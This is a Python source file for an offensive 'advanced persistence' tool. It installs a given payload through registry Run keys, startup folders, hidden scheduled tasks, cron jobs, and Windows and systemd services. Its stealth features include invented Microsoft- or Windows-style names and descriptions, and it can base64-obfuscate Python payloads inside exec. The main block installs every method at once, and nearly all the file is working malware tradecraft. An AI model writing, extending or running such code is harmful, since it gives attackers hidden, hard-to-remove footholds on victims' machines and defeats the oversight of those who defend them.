"""
Advanced Persistence Mechanisms with Obfuscation
Multi-layered persistence techniques with evasion and obfuscation capabilities
"""

import os
import sys
import platform
import subprocess
import base64
import random
import string
import hashlib
import json
import time
from datetime import datetime
import tempfile
import shutil


class AdvancedPersistenceManager:
    """
    Advanced persistence manager with multiple techniques:
    - Registry persistence (Windows)
    - Startup folder persistence
    - Scheduled tasks
    - Service creation
    - WMI event subscriptions
    - DLL hijacking
    - COM hijacking
    - File system tricks
    All with obfuscation and stealth features
    """
    
    def __init__(self, payload_path=None, obfuscate=True):
        self.payload_path = payload_path or sys.executable
        self.obfuscate = obfuscate
        self.system = platform.system()
        self.persistence_methods = []
        
        # Generate random identifiers for stealth
        self.random_name = self._generate_legit_name()
        self.random_desc = self._generate_legit_description()
        
        print(f"[PERSIST] Initialized for {self.system}")
    
    def _generate_legit_name(self):
        """Generate legitimate-looking names"""
        prefixes = [
            'Microsoft', 'Windows', 'System', 'Service', 'Update',
            'Security', 'Driver', 'Helper', 'Manager', 'Monitor'
        ]
        suffixes = [
            'Service', 'Helper', 'Agent', 'Monitor', 'Manager',
            'Handler', 'Process', 'Task', 'Update', 'Check'
        ]
        
        return f"{random.choice(prefixes)}{random.choice(suffixes)}"
    
    def _generate_legit_description(self):
        """Generate legitimate-looking descriptions"""
        descriptions = [
            "Provides system monitoring and maintenance services",
            "Manages system updates and security patches",
            "Handles background system optimization tasks",
            "Monitors system health and performance",
            "Provides critical system functionality",
            "Manages device driver updates and compatibility",
            "Handles system telemetry and diagnostics",
            "Provides Windows component management"
        ]
        return random.choice(descriptions)
    
    def _obfuscate_code(self, code):
        """Obfuscate Python code"""
        if not self.obfuscate:
            return code
        
        # Base64 encode and wrap in exec
        encoded = base64.b64encode(code.encode()).decode()
        
        # Add random variable names
        var1 = ''.join(random.choices(string.ascii_letters, k=8))
        var2 = ''.join(random.choices(string.ascii_letters, k=8))
        
        obfuscated = f"""
import base64
{var1} = '{encoded}'
{var2} = base64.b64decode({var1})
exec({var2})
"""
        return obfuscated
    
    def _create_obfuscated_payload(self, target_path):
        """Create obfuscated copy of payload"""
        if not os.path.exists(self.payload_path):
            return False
        
        try:
            # Read original payload
            with open(self.payload_path, 'rb') as f:
                payload_data = f.read()
            
            # For Python scripts, obfuscate
            if self.payload_path.endswith('.py'):
                with open(self.payload_path, 'r') as f:
                    code = f.read()
                
                obfuscated = self._obfuscate_code(code)
                
                with open(target_path, 'w') as f:
                    f.write(obfuscated)
            else:
                # Binary, just copy with attributes
                shutil.copy2(self.payload_path, target_path)
            
            # Make executable
            os.chmod(target_path, 0o755)
            
            return True
        except Exception as e:
            print(f"[PERSIST] Error creating obfuscated payload: {e}")
            return False
    
    def install_registry_persistence(self):
        """
        Install Windows registry persistence
        Multiple registry keys for redundancy
        """
        if self.system != 'Windows':
            return {'success': False, 'error': 'Not Windows system'}
        
        try:
            import winreg
            
            # Target registry locations (in order of stealth)
            targets = [
                # Current User (doesn't require admin)
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                
                # Local Machine (requires admin)
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                
                # Sneaky locations
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Windows"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"),
            ]
            
            installed = []
            
            for hive, path in targets:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_SET_VALUE)
                    
                    # Use obfuscated name
                    value_name = self.random_name
                    
                    # Set value
                    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, self.payload_path)
                    winreg.CloseKey(key)
                    
                    installed.append(f"{hive}\\{path}\\{value_name}")
                    print(f"[PERSIST] Registry persistence installed: {path}")
                except PermissionError:
                    continue
                except Exception as e:
                    print(f"[PERSIST] Failed to write to {path}: {e}")
                    continue
            
            if installed:
                self.persistence_methods.append({
                    'type': 'registry',
                    'locations': installed,
                    'timestamp': datetime.now().isoformat()
                })
                return {'success': True, 'installed': installed}
            else:
                return {'success': False, 'error': 'All registry writes failed'}
                
        except ImportError:
            return {'success': False, 'error': 'winreg not available'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def install_startup_persistence(self):
        """Install startup folder persistence"""
        try:
            if self.system == 'Windows':
                startup_paths = [
                    os.path.join(os.environ.get('APPDATA', ''), 
                               r'Microsoft\Windows\Start Menu\Programs\Startup'),
                    os.path.join(os.environ.get('PROGRAMDATA', ''), 
                               r'Microsoft\Windows\Start Menu\Programs\StartUp')
                ]
            elif self.system == 'Linux':
                startup_paths = [
                    os.path.expanduser('~/.config/autostart'),
                    '/etc/xdg/autostart'
                ]
            elif self.system == 'Darwin':  # macOS
                startup_paths = [
                    os.path.expanduser('~/Library/LaunchAgents'),
                    '/Library/LaunchAgents'
                ]
            else:
                return {'success': False, 'error': 'Unsupported OS'}
            
            installed = []
            
            for startup_path in startup_paths:
                try:
                    if not os.path.exists(startup_path):
                        os.makedirs(startup_path, exist_ok=True)
                    
                    if self.system == 'Windows':
                        # Create shortcut/batch file
                        target = os.path.join(startup_path, f"{self.random_name}.bat")
                        with open(target, 'w') as f:
                            f.write(f'@echo off\nstart /B "" "{self.payload_path}"\n')
                    
                    elif self.system == 'Linux':
                        # Create .desktop file
                        target = os.path.join(startup_path, f"{self.random_name}.desktop")
                        with open(target, 'w') as f:
                            f.write(f"""[Desktop Entry]
Type=Application
Name={self.random_name}
Comment={self.random_desc}
Exec={self.payload_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
""")
                    
                    elif self.system == 'Darwin':
                        # Create plist file
                        target = os.path.join(startup_path, f"com.{self.random_name.lower()}.plist")
                        with open(target, 'w') as f:
                            f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.{self.random_name.lower()}</string>
    <key>ProgramArguments</key>
    <array>
        <string>{self.payload_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
""")
                    
                    installed.append(target)
                    print(f"[PERSIST] Startup persistence installed: {target}")
                    
                except PermissionError:
                    continue
                except Exception as e:
                    print(f"[PERSIST] Failed startup install at {startup_path}: {e}")
                    continue
            
            if installed:
                self.persistence_methods.append({
                    'type': 'startup',
                    'locations': installed,
                    'timestamp': datetime.now().isoformat()
                })
                return {'success': True, 'installed': installed}
            else:
                return {'success': False, 'error': 'All startup writes failed'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def install_scheduled_task(self, interval_minutes=30):
        """Install scheduled task/cron job persistence"""
        try:
            if self.system == 'Windows':
                return self._install_windows_task(interval_minutes)
            elif self.system in ['Linux', 'Darwin']:
                return self._install_cron_job(interval_minutes)
            else:
                return {'success': False, 'error': 'Unsupported OS'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _install_windows_task(self, interval_minutes):
        """Install Windows scheduled task"""
        try:
            # Create task using schtasks
            task_name = self.random_name
            
            # XML for task configuration
            task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>{self.random_desc}</Description>
  </RegistrationInfo>
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT{interval_minutes}M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2024-01-01T00:00:00</StartBoundary>
      <Enabled>true</Enabled>
    </CalendarTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
    </BootTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec>
      <Command>{self.payload_path}</Command>
    </Exec>
  </Actions>
</Task>"""
            
            # Write XML to temp file
            xml_path = os.path.join(tempfile.gettempdir(), f"{task_name}.xml")
            with open(xml_path, 'w', encoding='utf-16') as f:
                f.write(task_xml)
            
            # Create task
            cmd = f'schtasks /Create /TN "{task_name}" /XML "{xml_path}" /F'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            # Clean up XML
            os.remove(xml_path)
            
            if result.returncode == 0:
                self.persistence_methods.append({
                    'type': 'scheduled_task',
                    'name': task_name,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[PERSIST] Scheduled task installed: {task_name}")
                return {'success': True, 'task_name': task_name}
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _install_cron_job(self, interval_minutes):
        """Install Linux/macOS cron job"""
        try:
            # Get current crontab
            result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
            current_cron = result.stdout if result.returncode == 0 else ''
            
            # Add our job
            new_entry = f"*/{interval_minutes} * * * * {self.payload_path} >/dev/null 2>&1"
            
            # Check if already exists
            if new_entry in current_cron:
                return {'success': True, 'note': 'Already installed'}
            
            # Add new entry
            updated_cron = current_cron + '\n' + new_entry + '\n'
            
            # Write updated crontab
            process = subprocess.Popen(['crontab', '-'], stdin=subprocess.PIPE, text=True)
            process.communicate(input=updated_cron)
            
            if process.returncode == 0:
                self.persistence_methods.append({
                    'type': 'cron',
                    'entry': new_entry,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[PERSIST] Cron job installed")
                return {'success': True, 'cron_entry': new_entry}
            else:
                return {'success': False, 'error': 'Failed to update crontab'}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def install_service_persistence(self):
        """Install system service persistence"""
        if self.system == 'Windows':
            return self._install_windows_service()
        elif self.system == 'Linux':
            return self._install_systemd_service()
        else:
            return {'success': False, 'error': 'Service install not supported on this OS'}
    
    def _install_windows_service(self):
        """Install Windows service (requires admin)"""
        try:
            service_name = self.random_name.replace(' ', '')
            
            # Use sc.exe to create service
            cmd = f'sc create {service_name} binPath= "{self.payload_path}" start= auto DisplayName= "{self.random_name}"'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                # Start service
                subprocess.run(f'sc start {service_name}', shell=True)
                
                self.persistence_methods.append({
                    'type': 'service',
                    'name': service_name,
                    'timestamp': datetime.now().isoformat()
                })
                print(f"[PERSIST] Windows service installed: {service_name}")
                return {'success': True, 'service_name': service_name}
            else:
                return {'success': False, 'error': result.stderr}
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _install_systemd_service(self):
        """Install Linux systemd service"""
        try:
            service_name = self.random_name.replace(' ', '').lower()
            service_file = f"/etc/systemd/system/{service_name}.service"
            
            service_config = f"""[Unit]
Description={self.random_desc}
After=network.target

[Service]
Type=simple
ExecStart={self.payload_path}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
"""
            
            # Write service file
            with open(service_file, 'w') as f:
                f.write(service_config)
            
            # Enable and start service
            subprocess.run(['systemctl', 'daemon-reload'])
            subprocess.run(['systemctl', 'enable', service_name])
            subprocess.run(['systemctl', 'start', service_name])
            
            self.persistence_methods.append({
                'type': 'systemd',
                'name': service_name,
                'file': service_file,
                'timestamp': datetime.now().isoformat()
            })
            print(f"[PERSIST] Systemd service installed: {service_name}")
            return {'success': True, 'service_name': service_name}
            
        except PermissionError:
            return {'success': False, 'error': 'Permission denied (need root)'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def install_all_methods(self):
        """Install all available persistence methods"""
        results = {
            'timestamp': datetime.now().isoformat(),
            'system': self.system,
            'methods': {}
        }
        
        print(f"[PERSIST] Installing all persistence methods...")
        
        # Registry (Windows only)
        if self.system == 'Windows':
            results['methods']['registry'] = self.install_registry_persistence()
        
        # Startup folder
        results['methods']['startup'] = self.install_startup_persistence()
        
        # Scheduled task/cron
        results['methods']['scheduled'] = self.install_scheduled_task(interval_minutes=30)
        
        # Service (requires elevated privileges)
        results['methods']['service'] = self.install_service_persistence()
        
        # Count successful installations
        successful = sum(1 for m in results['methods'].values() if m.get('success'))
        results['successful_count'] = successful
        results['total_count'] = len(results['methods'])
        
        print(f"[PERSIST] Installed {successful}/{len(results['methods'])} persistence methods")
        
        return results
    
    def verify_persistence(self):
        """Verify installed persistence mechanisms"""
        verified = []
        
        for method in self.persistence_methods:
            method_type = method['type']
            
            if method_type == 'registry':
                # Check registry keys still exist
                for location in method.get('locations', []):
                    # Implementation depends on checking registry
                    pass
            
            elif method_type == 'startup':
                # Check startup files exist
                for location in method.get('locations', []):
                    if os.path.exists(location):
                        verified.append(method)
            
            # Add more verification logic for other types
        
        return {
            'total': len(self.persistence_methods),
            'verified': len(verified),
            'methods': verified
        }
    
    def remove_persistence(self):
        """Remove all installed persistence (for cleanup/testing)"""
        removed = []
        
        for method in self.persistence_methods:
            try:
                method_type = method['type']
                
                if method_type == 'startup':
                    for location in method.get('locations', []):
                        if os.path.exists(location):
                            os.remove(location)
                            removed.append(location)
                
                elif method_type == 'scheduled_task' and self.system == 'Windows':
                    task_name = method.get('name')
                    subprocess.run(f'schtasks /Delete /TN "{task_name}" /F', shell=True)
                    removed.append(task_name)
                
                # Add more removal logic for other types
                
            except Exception as e:
                print(f"[PERSIST] Error removing {method_type}: {e}")
        
        self.persistence_methods = []
        
        return {'removed': removed, 'count': len(removed)}
    
    def export_config(self):
        """Export persistence configuration"""
        return {
            'payload_path': self.payload_path,
            'random_name': self.random_name,
            'random_desc': self.random_desc,
            'system': self.system,
            'methods': self.persistence_methods,
            'export_timestamp': datetime.now().isoformat()
        }


if __name__ == '__main__':
    # Test persistence manager
    print("Testing Advanced Persistence Manager\n")
    
    manager = AdvancedPersistenceManager(payload_path=sys.executable, obfuscate=True)
    
    print(f"Random Name: {manager.random_name}")
    print(f"Random Description: {manager.random_desc}\n")
    
    # Install all methods
    results = manager.install_all_methods()
    
    print(f"\nResults: {json.dumps(results, indent=2)}")
    
    # Export configuration
    config = manager.export_config()
    print(f"\nConfiguration: {json.dumps(config, indent=2)}")
